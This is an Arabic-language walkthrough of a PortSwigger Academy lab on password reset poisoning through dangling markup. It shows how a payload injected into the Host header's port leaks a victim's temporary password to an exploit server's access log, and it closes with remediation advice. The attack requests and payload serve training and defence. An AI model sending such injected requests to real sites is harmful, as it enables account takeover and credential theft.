# [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

## **`الهدف`**
القيام بإعادة ضبط كلمة مرور `reset password` حساب `carlos` ثم الدخول إلي حسابه.
## **`خطوات الحل`**
نقوم بالضغط على `Forgot password?` ونكتب اسم `wiener` ونقوم باعتراض الـ `request` وتحويله إلى `Repeater`
```http
POST /forgot-password HTTP/2
Host: 0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net
Cookie: session=7l47huJNMeYRFZXAUeyk9Yub3CSgtY0l; _lab=46%7cMCwCFC%2fbf%2b2%2bx88W%2fj7lQQKzJwXSV4TVAhQn4ZtUVi2Rqcq1buO8QldxsGTenLjmfYRlIv8Lv%2bcvtrc8ODUfOVMLyKVe6%2fpGLXGNtaxLsFsVvOr3HKVQcPeNsaz4k63dh36Uie%2faOzL50z4giM7N8bsEkbhSHzJ3GUtuv0%2bGm18A0Rk%3d

csrf=uKzYcngGYT0RsvTrv7tFEBh0XW3BfGrQ&username=wiener
```
وبعد ذلك سنقوم بتمريره.

وندخل إلى الـ `Email Client` داخل سيرفر الاستغلال لنفحص الصيغة الطبيعية للبريد الإلكتروني
```Email
Hello!

Please [click here](https://0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net/login) to login with your new password: J5K9SopX51

Thanks,  
Support team

_This email has been scanned by the MacCarthy Email Security service_
```

ولكن إذا عدنا إلى سيرفر الاستغلال ودخلنا إلى الـ `Access log` سنلاحظ هذا السطر
```
156.218.100.63  2026-09-14 07:27:03 +0000 "GET /resources/js/domPurify-2.0.15.js HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```
وهذا يعنى أنه يتم تعقيم نص البريد الإلكتروني قبل عرضه فى المتصفح باستخدام `domPurify` ولذلك سنعود مرة أخرى إلى داخل البريد الإلكتروني ونضغط على `View raw` لنفحص البريد الإلكتروني بصيغة `HTML`
```html
Sent:     2026-09-14 07:27:36 +0000
From:     no-reply@0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net
To:       wiener@exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net/login'>click here</a> to login with your new password: J5K9SopX51</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```
ثم ننتقل إلى `Repeater` لنقوم بعدة تجارب.

أولًا: عند محاولة تغيير ترويسة `Host` إلى سيرفر الاستغلال الموجود فى اللاب سنلاحظ حدوث خطأ في الاستجابة
```http
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 199

<html>
	<head>
	    <title>
		    Server Error: Gateway Timeout
		</title>
	</head>
  <body>
	<h1>
		Server Error: Gateway Timeout (3) connecting to exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net
	</h1>
  </body>
</html>
```

وإذا حاولنا إضافة ترويسة `X-Forwarded-Host:` سيمر الطلب بدون مشاكل ولكن سنجد أنه يتم تجاهلها تمامًا ولا يحدث أي تغيير في البريد الإلكتروني.

ولكن عندما نجرب تعديل الطلب لنضيف `Port` ونضع مكانه أى كلمة للإختبار
```http
POST /forgot-password HTTP/2
Host: 0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net:Test
Cookie: session=7l47huJNMeYRFZXAUeyk9Yub3CSgtY0l; _lab=46%7cMCwCFC%2fbf%2b2%2bx88W%2fj7lQQKzJwXSV4TVAhQn4ZtUVi2Rqcq1buO8QldxsGTenLjmfYRlIv8Lv%2bcvtrc8ODUfOVMLyKVe6%2fpGLXGNtaxLsFsVvOr3HKVQcPeNsaz4k63dh36Uie%2faOzL50z4giM7N8bsEkbhSHzJ3GUtuv0%2bGm18A0Rk%3d

csrf=uKzYcngGYT0RsvTrv7tFEBh0XW3BfGrQ&username=wiener
```

سنلاحظ أن الكلمة التى حقناها `Test` تظهر بداخلها
```html
Sent:     2026-09-14 08:10:59 +0000
From:     no-reply@0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net
To:       wiener@exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net:Test/login'>click here</a> to login with your new password: InYPHdZe3D</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```

لذلك سنقوم بتجربة أخيرة بحقن هذا الـ `Payload` في الـ `Port`
```Payload
'<a href="//exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net/?
```
ونقوم بإرسال الطلب 
```http
POST /forgot-password HTTP/2
Host: 0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net:'<a href="//exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net/?
Cookie: session=7l47huJNMeYRFZXAUeyk9Yub3CSgtY0l; _lab=46%7cMCwCFC%2fbf%2b2%2bx88W%2fj7lQQKzJwXSV4TVAhQn4ZtUVi2Rqcq1buO8QldxsGTenLjmfYRlIv8Lv%2bcvtrc8ODUfOVMLyKVe6%2fpGLXGNtaxLsFsVvOr3HKVQcPeNsaz4k63dh36Uie%2faOzL50z4giM7N8bsEkbhSHzJ3GUtuv0%2bGm18A0Rk%3d

csrf=uKzYcngGYT0RsvTrv7tFEBh0XW3BfGrQ&username=wiener
```
وبفحص البريد الإلكتروني سنجده كالتالي:
```html
Sent:     2026-09-14 08:15:23 +0000
From:     no-reply@0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net
To:       wiener@exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net:'<a href="//exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net/?/login'>click here</a> to login with your new password: F233v9rPnf</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```

ولذلك سنقوم بإعادة إرسال نفس الطلب ولكن بتغيير اسم `wiener` إلى `carlos`
```http
POST /forgot-password HTTP/2
Host: 0ac600ab03fdb8eb80b4b73c001d0030.web-security-academy.net:'<a href="//exploit-0aa000e103ceb8b080cab66401fa006f.exploit-server.net/?
Cookie: session=7l47huJNMeYRFZXAUeyk9Yub3CSgtY0l; _lab=46%7cMCwCFC%2fbf%2b2%2bx88W%2fj7lQQKzJwXSV4TVAhQn4ZtUVi2Rqcq1buO8QldxsGTenLjmfYRlIv8Lv%2bcvtrc8ODUfOVMLyKVe6%2fpGLXGNtaxLsFsVvOr3HKVQcPeNsaz4k63dh36Uie%2faOzL50z4giM7N8bsEkbhSHzJ3GUtuv0%2bGm18A0Rk%3d

csrf=uKzYcngGYT0RsvTrv7tFEBh0XW3BfGrQ&username=carlos
```

وبعد ذلك نتوجه إلى صفحة `Access log` بداخل سيرفر الاستغلال لنجد السطر التالي
```
10.0.3.184      2026-09-14 08:22:31 +0000 "GET /?/login'>click+here</a>+to+login+with+your+new+password:+JlWMdZoLBp</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 200
```

فنقوم بنسخ كلمة المرور ونقوم بإستخدامها للدخول لحساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب على التطبيق عمل `Context-Aware HTML Encoding` لأي بيانات ديناميكية يتم إدراجها داخل قالب الإيميل، بحيث لو تم حقن علامة التنصيص الفردية `'` أو وسم `<a`، يتم تحويلها إلى كيانات آمنة مثل `&apos;` و `&lt;`. هذا سيمنع المتصفح أو أي أداة فحص مثل `Email Scanner` من تنفيذ الكود أو التسبب في `Dangling Markup`.

يجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Forwarded-Host`) لمعرفة النطاق `Domain` الخاص به عند إنشاء روابط حساسة، وبدلاً من ذلك، يتم تعريف الرابط الأساسي للموقع `Base URL` بشكل ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`.

وإذا كان التطبيق مُجبراً على استخراج الـ `Port` من ترويسة `Host`، فيجب وضع تحقق صارم `Validation` يتأكد من أن القيمة المدخلة بعد النقطتين `:` هي مجرد أرقام صحيحة `Integer` تتراوح بين `1` و `65535` فقط، وأي قيمة أخرى يجب أن تؤدي إلى رفض الطلب `400 Bad Request`.

ويجب أن يتم الاستغناء عن إرسال كلمات مرور مؤقتة في نص البريد الإلكتروني لأن البريد الإلكتروني وسيلة اتصال غير مشفرة كلياً (يمكن اعتراضه أو حفظه في خوادم البريد)، وبدلًا من ذلك يجب أن يقوم النظام بإنشاء رابط إعادة تعيين يحتوي على `Token` تم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم

ويجب أن يكون الـ `token` له مدة صلاحية قصيرة `10-15` دقيقة ويتم حرقه بعدها حتى لو لم يتم استخدامه.

ويُفضل عندما يضغط المُستخدم على رابط إعادة ضبط كلمة المرور في حسابه أن يقوم السيرفر باستخراج الـ `token` من الـ `URL` وتضمينه داخل الـ `Form` كـ `hidden input` مثلًا، وعندما يكتب المُستخدم كلمة المرور الجديدة ويضعط حفظ يتم إرساله عبر الـ `POST Body` وليس بداخل الـ `URL`  لأن الـ `URLs` يتم تسجيلها في ملفات الـ `Logs` الخاصة بالسيرفر والـ `Proxy`، وهذا قد يؤدي لتسريب الـ `token` إذا لم يكن السيرفر مؤمن جيدًا، أو إذا كان المُستخدم يستعمل نوعًا من الـ `Proxy` أو الـ `VPN.`

ولكن إذا كان الموقع مصر على استعمال طريقة كلمات المرور المؤقة فيجب أن تكون كلمة المرور المُرسلة مؤقتة وبمجرد أن يسجل المستخدم الدخول بها، يرفض النظام إعطاءه أي صلاحيات ويحوله فوراً لصفحة تُجبره على تعيين كلمة مرور جديدة لا يعرفها النظام نفسه، بالإضافة إلى تحديد مدة صلاحية قصيرة `10 أو 15 دقيقة` لكلمة المرور المؤقتة يتم حرقها بعدها حتى لو لم يتم إستخدامها، بالإضافة إلى وضع `Rate Limit` لطلبات كلمات المرور المؤقتة.
